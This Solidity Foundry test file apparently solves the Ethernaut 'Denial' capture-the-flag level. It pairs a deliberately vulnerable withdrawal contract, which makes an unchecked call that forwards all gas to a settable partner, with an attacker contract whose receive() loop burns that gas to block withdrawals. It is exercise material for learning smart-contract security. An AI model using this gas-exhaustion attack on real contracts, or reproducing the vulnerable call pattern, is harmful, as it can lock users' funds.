// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract DOSTest is Test {
    Denial denial;
    HDOS dos;
    function setUp() public {
        denial = new Denial();
        dos = new HDOS(denial);
    }

    function testGenDOS() public {
        dos.bePartner();
        dos.withdraw{gas: 1e6 - 1}();
    }
}

contract HDOS {
    Denial denial;
    uint256 readWrite;
    constructor(Denial _denial) {
        denial = _denial;
    }

    function _deny() internal {
        // address(denial).call{value: msg.value}(
        //     abi.encodeWithSignature("withdraw()")
        // );
        while (gasleft() > 0 && gasleft() <= 1e6) {
            readWrite = type(uint256).max;
        }
    }

    receive() external payable {
        _deny();
    }

    function bePartner() external {
        denial.setWithdrawPartner(address(this));
    }

    function withdraw() external {
        denial.withdraw();
    }
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        console.log("Withdrawing");
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
